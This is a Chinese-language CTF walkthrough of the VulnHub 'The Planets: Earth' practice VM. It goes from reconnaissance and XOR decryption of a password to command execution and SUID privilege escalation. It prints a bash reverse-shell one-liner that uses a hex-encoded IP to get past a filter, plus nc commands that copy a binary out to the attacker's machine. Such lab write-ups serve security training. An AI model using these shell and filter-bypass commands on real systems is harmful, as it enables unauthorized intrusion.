---
title: VulnHub The Planets：Earth
date: 2026-05-06 16:21:00
categories: 
  - VulnHub
tags:
  - 异或解密
  - CTF
  - RCE
  - SUID 提权
---

# The Planets：Earth

项目地址：https://download.vulnhub.com/theplanets/Earth.ova

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本，发现有两个域名

![](https://pic1.imgdb.cn/item/69fb12e44498ed47aaabe205.png)

更新到 `/etc/hosts` 文件中

![](https://pic1.imgdb.cn/item/69fb16344498ed47aaabea2e.png)

## CTF

### 异或解密

访问域名的 80 端口来到 Web 页面

![](https://pic1.imgdb.cn/item/69fb166a4498ed47aaabea46.png)

80 端口的话两个域名访问的页面相同

给第一个站点换成 443 端口可以正常访问

![](https://pic1.imgdb.cn/item/69fb17ee4498ed47aaabefd8.png)

但是第二个变成了另外一个页面

![](https://pic1.imgdb.cn/item/69fb18574498ed47aaabf08b.png)

分别对这四个页面进行目录扫描

![](https://pic1.imgdb.cn/item/69fb187c4498ed47aaabf108.png)

访问过去拿到提示

![](https://pic1.imgdb.cn/item/69fb18904498ed47aaabf143.png)

后缀为 `*`，我们换成 `txt` 访问找到了用户名 terra

![](https://pic1.imgdb.cn/item/69fb18b34498ed47aaabf188.png)

并且得知主页上的信息是用异或加密的，在这部分

![](https://pic1.imgdb.cn/item/69fb19144498ed47aaabf274.png)

还使用 `testdata.txt` 来测试加密

![](https://pic1.imgdb.cn/item/69fb193f4498ed47aaabf2df.png)

异或加密需要两部分，其中一部分已经给出，就是 `testdata.txt`

另一部分推测是页面下面的数值，于是去异或解密

![](https://pic1.imgdb.cn/item/69fb1c9e4498ed47aaabfaa0.png)

拿到重复的 `earthclimatechangebad4humans`，推测是密码

结合前面信息收集扫描出的一个后台

![](https://pic1.imgdb.cn/item/69fb1cec4498ed47aaabfb99.png)

登录成功

![](https://pic1.imgdb.cn/item/69fb1d154498ed47aaabfc0d.png)

## RCE

### Admin Command Tool（十六禁止绕过）

尝试直接弹 Shell 无果，回显禁止远程连接

![](https://pic1.imgdb.cn/item/69fb1d634498ed47aaabfd1c.png)

推测是对 IP 做了限制，使用十六进制绕过

```bash
bash -i >& /dev/tcp/0xC0.0xA8.0x6E.0x80/6666 0>&1
```

成功拿到 Shell

![](https://pic1.imgdb.cn/item/69fb1f3e4498ed47aaabffa9.png)

## 提权

### SUID 提权

查看权限没给机会，找到一个带有 SUID 的文件

![](https://pic1.imgdb.cn/item/69fb1fd54498ed47aaac0237.png)

直接运行无果，说是所有触发器均不存在

![](https://pic1.imgdb.cn/item/69fb211a4498ed47aaac0266.png)

利用 `nc` 传递文件，服务端：`nc -nlvp 8899 > reset_root`

shell 端：`nc 192.168.0.12 8899 < /usr/bin/reset_root`，不分先后顺序

![](https://pic1.imgdb.cn/item/69fb23f14498ed47aaac0563.png)

然后使用 `strace` 进行调试 `strace ./reset_root`，显示缺少三个文件

![](https://pic1.imgdb.cn/item/69fb24444498ed47aaac05bd.png)

对应的靶机也没有找到这三个文件，于是去创建

```bash
access("/dev/shm/kHgTFI5G", F_OK)       = -1 ENOENT (No such file or directory)
access("/dev/shm/Zw7bV9U5", F_OK)       = -1 ENOENT (No such file or directory)
access("/tmp/kcM0Wewe", F_OK)           = -1 ENOENT (No such file or directory)
write(1, "RESET FAILED, ALL TRIGGERS ARE N"..., 44RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.) = 44
```

最后运行程序成功重置密码拿到 Shell

![](https://pic1.imgdb.cn/item/69fb24b74498ed47aaac0642.png)